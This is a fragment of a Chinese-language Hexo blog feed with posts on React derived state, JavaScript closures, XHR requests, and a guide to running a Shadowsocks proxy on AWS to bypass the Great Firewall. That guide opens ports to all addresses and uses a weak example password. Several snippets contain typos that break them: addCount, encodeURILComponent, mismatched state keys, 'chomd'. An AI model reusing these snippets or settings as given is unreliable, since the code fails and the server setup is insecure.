class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">email</span>: <span class="keyword">this</span>.props.defaultEmail &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; <span class="attr">email</span>: event.target.value &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p>当父组件需要改变state的值时，我们可以使用<code>key</code>这个特殊的React属性。当<code>key</code>变化时，React会创建一个新的而不是更新一个既有的组件。每次key变化，表单里的所有组件都会用新的初始值重新创建。大部分情况下，这是处理state的最好办法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;EmailInput</span><br><span class="line">  defaultEmail=&#123;<span class="keyword">this</span>.props.user.email&#125;</span><br><span class="line">  key=&#123;<span class="keyword">this</span>.props.user.id&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-getDerivedStateFromProps"><a href="#3-3-getDerivedStateFromProps" class="headerlink" title="3.3 getDerivedStateFromProps"></a>3.3 getDerivedStateFromProps</h4><p>但有时组件初始化的开销太大，一个麻烦但可行的方案是在<code>getDerivedStateFromPorps</code>观察<code>userID</code>的变化。这样可以确认state的值，是通过父组件修改的，再做对应的处理。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    email: <span class="keyword">this</span>.props.defaultEmail,</span><br><span class="line">    prePropUserID: <span class="keyword">this</span>.props.userID</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> getDerivedStateFromProps(props, state) &#123;</span><br><span class="line">    <span class="keyword">if</span> (props.userID !== state.prevPropsUserID) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        email: props.defaultEmail,</span><br><span class="line">        prevPropsUserID: props.userID</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-ref调用子组件方法"><a href="#3-4-ref调用子组件方法" class="headerlink" title="3.4 ref调用子组件方法"></a>3.4 ref调用子组件方法</h4><p>注意，不能ref高阶组件(connect到redux的组件)</p><p><br></p><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://zh-hans.reactjs.org/blog/2018/06/07/you-probably-dont-need-derived-state.html#when-to-use-derived-state" target="_blank" rel="noopener">React文档-你可能不需要使用派生state</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>闭包</title>
      <link href="/2019/07/12/%E9%97%AD%E5%8C%85/"/>
      <url>/2019/07/12/%E9%97%AD%E5%8C%85/</url>
      <content type="html"><![CDATA[<h3 id="1-什么是闭包"><a href="#1-什么是闭包" class="headerlink" title="1. 什么是闭包"></a>1. 什么是闭包</h3><p><strong>闭包</strong>是指能够读取其他函数内部变量的函数。创建闭包的常见方式，就是在一个函数内部创建另一个函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1[propertyName];</span><br><span class="line">    <span class="keyword">var</span> value2 = object2[propertyName];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value1 - value2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在js中变量的作用域属于函数作用域，在函数执行完后，作用域就会被清理，内存也会随之被回收，但是由于闭包函数是建立在函数内部的子函数，由于其可访问上级作用域，即使上级函数执行完，作用域也不会随之销毁，这时的子函数（也就是闭包），便拥有了访问上级作用域中变量的权限，即使上级函数执行完后作用域内的值也不会被销毁。</p><p>这段代码中<code>increment</code>实际上就是闭包函数<code>myFunction</code>，它一共运行了三次，第一次的值是1,第二次的值是2，第三次的值是3，这证明了，函数<code>addCounter</code>中的局部变量<code>counter</code>一直保存在内存汇总，并没有在<code>addCounter</code>调用后被自动清除。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addCounter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> myFunction = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    counter = counter + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> counter;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> myFunction</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> increment = addCount();</span><br><span class="line"><span class="keyword">const</span> c1 = increment()</span><br><span class="line"><span class="keyword">const</span> c2 = increment()</span><br><span class="line"><span class="keyword">const</span> c3 = increment()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'increment:'</span>, c1, c2, c3)</span><br></pre></td></tr></table></figure></p><h4 id="1-1-闭包怎么产生"><a href="#1-1-闭包怎么产生" class="headerlink" title="1.1 闭包怎么产生"></a>1.1 闭包怎么产生</h4><p>当某个函数被调用时，会创建一个执行环境及相应的作用域链。然后，使用arguments和其他命名参数的值来初始化函数的活动对象。</p><p><br></p><h3 id="2-闭包的应用场景"><a href="#2-闭包的应用场景" class="headerlink" title="2. 闭包的应用场景"></a>2. 闭包的应用场景</h3><p>发送ajax请求成功|失败的回调，setTimeout的延时回调，或者一个函数内部返回另一个匿名函数，这些都是闭包的应用。</p><h4 id="2-1-取正确值问题"><a href="#2-1-取正确值问题" class="headerlink" title="2.1 取正确值问题"></a>2.1 取正确值问题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i)  <span class="comment">// 10个10</span></span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怎么取到每一次循环的正确值呢？声明10个自执行函数，保存当时的值到内部。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  (<span class="function">(<span class="params">j</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(j)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-使用闭包模拟私有变量"><a href="#2-2-使用闭包模拟私有变量" class="headerlink" title="2.2 使用闭包模拟私有变量"></a>2.2 使用闭包模拟私有变量</h4><p>私有变量在java里使用private声明就可以了，但是js中还没有，我们可以使用闭包模拟实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeBy</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounter += val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    increment: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(<span class="number">1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    decrement: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(<span class="number">-1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">counter.value() <span class="comment">// 0</span></span><br><span class="line">counter.increment();</span><br><span class="line">counter.value(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-闭包的缺点"><a href="#3-闭包的缺点" class="headerlink" title="3. 闭包的缺点"></a>3. 闭包的缺点</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>函数</title>
      <link href="/2019/07/12/%E5%87%BD%E6%95%B0/"/>
      <url>/2019/07/12/%E5%87%BD%E6%95%B0/</url>
      <content type="html"><![CDATA[<h3 id="1-闭包"><a href="#1-闭包" class="headerlink" title="1. 闭包"></a>1. 闭包</h3><p><strong>闭包</strong>是指能够读取其他函数内部变量的函数。</p><p>在js中变量的作用域属于函数作用域，在函数执行完后，作用域就会被清理，内存也会随之被回收，但是由于闭包函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>BFC,IFC,GFC,FFC</title>
      <link href="/2019/07/12/BFC-IFC-GFC-FFC/"/>
      <url>/2019/07/12/BFC-IFC-GFC-FFC/</url>
      <content type="html"><![CDATA[<h4 id="1-BFC-Block-formatting-contexts-块级格式上下文"><a href="#1-BFC-Block-formatting-contexts-块级格式上下文" class="headerlink" title="1. BFC(Block formatting contexts) 块级格式上下文"></a>1. BFC(Block formatting contexts) 块级格式上下文</h4><h4 id="2-IFC-inline-formatting-contexts-内联格式上下文"><a href="#2-IFC-inline-formatting-contexts-内联格式上下文" class="headerlink" title="2. IFC(inline formatting contexts) 内联格式上下文"></a>2. IFC(inline formatting contexts) 内联格式上下文</h4><h4 id="3-GFC-GrideLayout"><a href="#3-GFC-GrideLayout" class="headerlink" title="3. GFC(GrideLayout)"></a>3. GFC(GrideLayout)</h4>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CSS module</title>
      <link href="/2019/07/10/CSS-module/"/>
      <url>/2019/07/10/CSS-module/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>Webpack配置遇到的问题</title>
      <link href="/2019/07/08/Webpack%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
      <url>/2019/07/08/Webpack%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>科学上网</title>
      <link href="/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      <content type="html"><![CDATA[<h4 id="1-创建实例"><a href="#1-创建实例" class="headerlink" title="1. 创建实例"></a>1. 创建实例</h4><p>登录AWS控住台，创建EC2实例，设置实例</p><ul><li>定制服务器类型: Ubuntu Server</li><li>选择实例类型： 默认免费即可</li><li>配置实例：默认</li><li>添加存储：默认</li><li>配置安全组：先配置所有流量和端口开放</li><li>生成密钥对：创建新密钥对，填写密钥对名称(如<code>ufresh2011</code>)，下载密钥对。（下载下来是 私有密钥文件 .pem文件）。连接远程服务器时，需要再密钥文件下的文件目录里操作。</li><li>创建账单警报：接受账单警报，自动监控免费套餐是否超额，将要超额会向你的邮箱发邮件。</li><li>编辑入站规则，开通22端口(ssh)和8388端口(ssserver)<br>网络与安全 -&gt; 安全组 -&gt; 操作 -&gt; 编辑入站规则<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 类型 协议 端口范围 来源</span><br><span class="line">SSH TCP 22 自定义 0.0.0.0/0</span><br><span class="line">自定义TCP规则 TCP 8388 自定义 0.0.0.0/0</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-登录服务器"><a href="#2-登录服务器" class="headerlink" title="2. 登录服务器"></a>2. 登录服务器</h4><p>定制完成后，可以远程登录，在实例上右击，点击连接<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chomd 400 xxx.pem</span><br><span class="line">ssh -i "xxx.pem" xxx.com</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-安装ss"><a href="#3-安装ss" class="headerlink" title="3. 安装ss"></a>3. 安装ss</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 获取root权限</span><br><span class="line">sudo -s</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 更新apt-get</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装python包管理工具</span><br><span class="line">apt-get install python-setuptools</span><br><span class="line">apt-get install python pip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 安装shadowsock </span><br><span class="line">pip install shadowsock</span><br></pre></td></tr></table></figure><p>配置shadowsocks<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/shadowsocks</span><br><span class="line">vim /etc/shadowsocks/config.json</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> config.json文件内容</span><br><span class="line">&#123;</span><br><span class="line">  "server":"0.0.0.0",</span><br><span class="line">  "server_port":8388,</span><br><span class="line">  "local_address":"127.0.0.1",</span><br><span class="line">  "local_port":1080,</span><br><span class="line">  "password":"abcdef",</span><br><span class="line">  "timeout":300,</span><br><span class="line">  "method":"aes-256-cfb",</span><br><span class="line">  "fast_open":false,</span><br><span class="line">  "workers": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-启动shadowsocks"><a href="#4-启动shadowsocks" class="headerlink" title="4. 启动shadowsocks"></a>4. 启动shadowsocks</h4><p>启动时候会有报错，百度修改几个文件就好<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 启动</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d start </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>停止</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d stop </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 重启</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d restart</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-电脑上安装shadowsock"><a href="#5-电脑上安装shadowsock" class="headerlink" title="5. 电脑上安装shadowsock"></a>5. 电脑上安装shadowsock</h4><p>服务器地址：查看正在运行中的实例，找到公有ip<br>服务器端口：8388<br>密码：abcdef<br>加密: aes-2560-cfb</p><p><em>结束！</em><br><br></p><h4 id="6-原理"><a href="#6-原理" class="headerlink" title="6. 原理"></a>6. 原理</h4><p>在很久以前，访问各种网站都是简单而直接的，用户的请求发送到服务器，服务器直接将信息反馈给用户。有一天，GFW出现了，每当用户获取信息，都经过GFW，GFW将一些内容过滤掉，当用户触发GFW的过滤规则时，就会收到Connection Reset这样的响应内容，而无法接收到正常的内容，</p><p>ss利用境外服务器代理的方法绕过GFW的过滤。</p><ul><li>首先用户和境外服务器基于ssh建立起一条加密的通道</li><li>用户通过建立起的隧道进行代理，通过ssh server向真实的服务发起请求</li><li>返回内容再通过创建好的隧道返回给用户。</li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.eeebe.com/article/ce37aebf65afbef8.html" target="_blank" rel="noopener">https://www.eeebe.com/article/ce37aebf65afbef8.html</a></li><li><a href="http://www.tengewang.cn/archives/226.html" target="_blank" rel="noopener">http://www.tengewang.cn/archives/226.html</a></li></ul>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>XHR：实现一个Axios</title>
      <link href="/2019/06/26/Axios/"/>
      <url>/2019/06/26/Axios/</url>
      <content type="html"><![CDATA[<h3 id="1-Ajax"><a href="#1-Ajax" class="headerlink" title="1. Ajax"></a>1. Ajax</h3><h4 id="1-1-发送请求"><a href="#1-1-发送请求" class="headerlink" title="1.1 发送请求"></a>1.1 发送请求</h4><p>创建XHR对象后，哟啊提哦啊用的第一个方法是open()，open方法不会真正发送请求，而只是启动一个请求已备发送。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'get'</span>, <span class="string">'example.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'MyHeader'</span>, <span class="string">'MyValue'</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-监听请求状态"><a href="#1-2-监听请求状态" class="headerlink" title="1.2 监听请求状态"></a>1.2 监听请求状态</h4><p>XHR的<em><code>readyState</code></em>属性，表示请求/响应过程的当前活动阶段。只要readyState属性的值由一个值变成另一个值，都会触发一次<em><code>readystatechange</code></em>事件。</p><ul><li>0: 未初始化，尚未调用open()方法</li><li>1: 启动，已经调用open()方法，但尚未调用send()方法</li><li>2: 发送，已经调用send()方法， 当尚未接收到响应</li><li>3: 接收，已经接收到部分响应数据</li><li>4: 完成，已经接收到全部响应数据，而且已经可以在客户端使用了。</li></ul><p><br></p><h4 id="1-3-读取返回内容"><a href="#1-3-读取返回内容" class="headerlink" title="1.3 读取返回内容"></a>1.3 读取返回内容</h4><p>请求发出后，javascript代码会等到服务器响应之后再继续执行。在收到响应后，<em><code>xhr.readyState == 4</code></em>, 响应的数据会自动填充XHR对象的属性。相关属性</p><ul><li>xhr.responseText: 作为响应主题被返回的文本</li><li>xhr.responseXML: 如果响应的内容类型是text/xml, application/xml，这个属性中将保存包含着响应数据的XML DOM文档</li><li>xhr.status: 响应的HTTP状态</li><li>xhr.statusText: HTTP状态的说明</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span> || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">      alert(xhr.responseText)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      alert(<span class="string">"Request was unsuccessful:"</span> + xhr.status )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-4-取消请求"><a href="#1-4-取消请求" class="headerlink" title="1.4 取消请求"></a>1.4 取消请求</h4><p>在接收到响应之前，还可以调用<em><code>xhr.abort()</code></em>方法来取消异步请求。</p><p><br></p><h4 id="1-5-设置请求头"><a href="#1-5-设置请求头" class="headerlink" title="1.5 设置请求头"></a>1.5 设置请求头</h4><p>默认情况下，在发送XHR请求的同时，会发送下列头部信息。</p><ul><li>Accept: 浏览器能够处理的内容类型</li><li>Accept-Charset: 浏览器能够显示的字符集</li><li>Accept-Encoding: 浏览器能够处理的压缩编码</li><li>Accept-Language: 浏览器当前设置的语言</li><li>Connection: 浏览器与服务器之间连接的类型</li><li>Cookie: 当前页面设置的任何cookie</li><li>Host: 发出请求的页面所在的域</li><li>Referer: 发出请求的页面的URI</li><li>User-Agent: 浏览器的用户代理字符串</li></ul><p>有的浏览器允许开发人员重写默认的头部信息，有的浏览器不允许这样做。建议使用自定义的头部字段，否则有可能会影响服务器的响应。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置请求头</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">'myHeader'</span>, <span class="string">'myValue'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取响应头部信息</span></span><br><span class="line"><span class="keyword">var</span> myHeader = xhr.getResponseHeader(<span class="string">'myHeader'</span>);</span><br><span class="line"><span class="keyword">var</span> allHeaders = xhr.getAllResponseHeaders();  <span class="comment">// 返回多行文本内容</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-5-GET-POST"><a href="#1-5-GET-POST" class="headerlink" title="1.5 GET/POST"></a>1.5 GET/POST</h4><ul><li><p>GET请求<br>GET请求，将查询字符串参数追加到url的末尾，查询字符串的每个参数key,value都需使用<em><code>encodeURIComponent()</code></em>进行编码。所有键值对需由 &amp; 分隔。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于';/?:@&amp;=+$,#这些字符，在encodeURIComponent中统统会被编码。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addURLParam</span>(<span class="params">url, key, value</span>) </span>&#123;</span><br><span class="line">  url += (url.indexOf(<span class="string">"?"</span>) == <span class="number">-1</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>);</span><br><span class="line">  url += <span class="built_in">encodeURIComponent</span>(key) + <span class="string">'='</span> + encodeURILComponent(value);</span><br><span class="line">  <span class="keyword">return</span> url</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'example.php'</span>;</span><br><span class="line">url = addURLParam(url, <span class="string">"name"</span>, <span class="string">"Nicholas"</span>);</span><br><span class="line">url = addURLParam(url, <span class="string">"book"</span>, <span class="string">"Marketing"</span>);</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'get'</span>, url, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure></li><li><p>POST请求<br>POST请求把数据作为请求的主体提交，数据通过<code>xhr.send(data)</code>传入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// formData</span></span><br><span class="line"><span class="comment">// Content-type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xhr.send(data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// json</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-6-进度事件"><a href="#1-6-进度事件" class="headerlink" title="1.6 进度事件"></a>1.6 进度事件</h4><ul><li>loadstart: 在接收到响应数据的第一字节时触发</li><li>error: 在请求发生错误时触发</li><li>abort: 调用abort()后触发</li><li>load: 在接收到完整的响应数据时触发</li><li>loadend: 通信完成，或触发error, abort, load事件后触发</li><li>progress: 在接收响应期间持续不断地触发。事件会收到一个event对象，其target属性是xhr对象，包含着三个额外的属性: </li></ul><p><em><code>lengthComputable</code></em> 进度信息是否可用的布尔值,<br><em><code>position</code></em> 已经接收到的字节数,<br><em><code>totalSize</code></em> 根据Content-length响应头部确定的预期字节数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xhr.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> divStatus = <span class="built_in">document</span>.getElementById(<span class="string">'status'</span>);</span><br><span class="line">  <span class="keyword">if</span> (event.lengthComputable) &#123;</span><br><span class="line">    divStatus.innerHTML = <span class="string">"Received"</span> + event.position + <span class="string">"of"</span> + event.totalSize + <span class="string">"bytes"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-7-跨域请求"><a href="#1-7-跨域请求" class="headerlink" title="1.7 跨域请求"></a>1.7 跨域请求</h4><h5 id="1-7-1-CORS"><a href="#1-7-1-CORS" class="headerlink" title="1.7.1 CORS"></a>1.7.1 CORS</h5><p>CORS(Cross-Origin Resource Sharing, 跨源资源共享), 